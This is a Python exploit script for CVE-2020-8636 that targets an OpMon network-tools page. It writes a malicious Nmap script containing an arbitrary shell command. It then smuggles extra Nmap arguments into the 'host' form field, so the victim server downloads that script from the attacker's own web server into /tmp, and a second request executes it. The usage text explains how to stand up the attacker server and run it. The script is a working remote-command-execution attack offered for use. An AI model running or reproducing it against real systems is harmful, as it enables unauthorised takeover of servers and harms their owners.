"""
CVE-2020-8636

OBS: It's necessary to start your server which will make a script available for download on the victim's server
ex: php -S 0.0.0.0:1337
Then, run the scan by passing the server, your server, the your server port and the command to be executed!
ex: python xpl.py https://VITME_HOST MY_HOST MY_PORT COMMAND

Discovered and developed by @phor3nsic

"""
import sys
import os
import requests
import time
import urllib3
import random
import string
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)


if len(sys.argv) < 2 :
	print("""
                                                                                            
 @@@@@@   @@@@@@@   @@@@@@@@@@    @@@@@@   @@@  @@@   @@@@@@   @@@@@@@  @@@@@@@@  @@@@@@@   
@@@@@@@@  @@@@@@@@  @@@@@@@@@@@  @@@@@@@@  @@@@ @@@  @@@@@@@   @@@@@@@  @@@@@@@@  @@@@@@@@  
@@!  @@@  @@!  @@@  @@! @@! @@!  @@!  @@@  @@!@!@@@  !@@         @@!    @@!       @@!  @@@  
!@!  @!@  !@!  @!@  !@! !@! !@!  !@!  @!@  !@!!@!@!  !@!         !@!    !@!       !@!  @!@  
@!@  !@!  @!@@!@!   @!! !!@ @!@  @!@  !@!  @!@ !!@!  !!@@!!      @!!    @!!!:!    @!@!!@!   
!@!  !!!  !!@!!!    !@!   ! !@!  !@!  !!!  !@!  !!!   !!@!!!     !!!    !!!!!:    !!@!@!    
!!:  !!!  !!:       !!:     !!:  !!:  !!!  !!:  !!!       !:!    !!:    !!:       !!: :!!   
:!:  !:!  :!:       :!:     :!:  :!:  !:!  :!:  !:!      !:!     :!:    :!:       :!:  !:!  
::::: ::   ::       :::     ::   ::::: ::   ::   ::  :::: ::      ::     :: ::::  ::   :::  
 : :  :    :         :      :     : :  :   ::    :   :: : :       :     : :: ::    :   : :  

 CVE-2020-8636 by @phor3nsic
                                                                                            
""")
	print("[!] Usage: "+sys.argv[0]+" https://HOST LHOST LPORT CMD")
	sys.exit()
else :
	pass

SRV = sys.argv[1]
LHOST = sys.argv[2]
LPORT = sys.argv[3]
CMD = sys.argv[4]

def randStr(stringLength=10):
	latters=string.ascii_lowercase
	return ''.join(random.choice(latters) for i in range(stringLength))

script = randStr()+".nse" 
arq = open(script,"w")
arq.write('os.execute("echo $('+CMD+' && rm /tmp/'+script+')")')
arq.close()

def upload():
	
	cookies = {'services_limit':'100'}
	p1 = {"nmap":"on","nmap_options":"-v "+LPORT,"host":LHOST+" --script http-fetch --script-args http-fetch.destination=/tmp,http-fetch.url="+script}
	req1 = requests.post(SRV+"/opmon/nettools/nettools.php", cookies=cookies, data=p1, verify=False)
	#print(req1.text)
	
	if "Successfully Downloaded" in req1.text:
		pass
	else:
		print("[!] The server is not vulnerable")
		os.system('rm *.nse')
		sys.exit()

	if "Failed to resolve" in req1.text:
		print("[!] The server not have external connections")
		os.system('rm *.nse')
		sys.exit()

def execute():
	cookies = {'services_limit':'100'}
	p2 = {"nmap":"on","nmap_options":"-v","host":"0.0.0.0 --script=/tmp/"+script}
	req2 = requests.post(SRV+"/opmon/nettools/nettools.php", cookies=cookies, data=p2, verify=False)

	r = req2.text.split("<blockquote>")
	r1= r[1].split("<br />")
	print(r1[1])

def main():
	upload()
	time.sleep(2)
	execute()
	os.system('rm *.nse')


if __name__ == '__main__':

	main()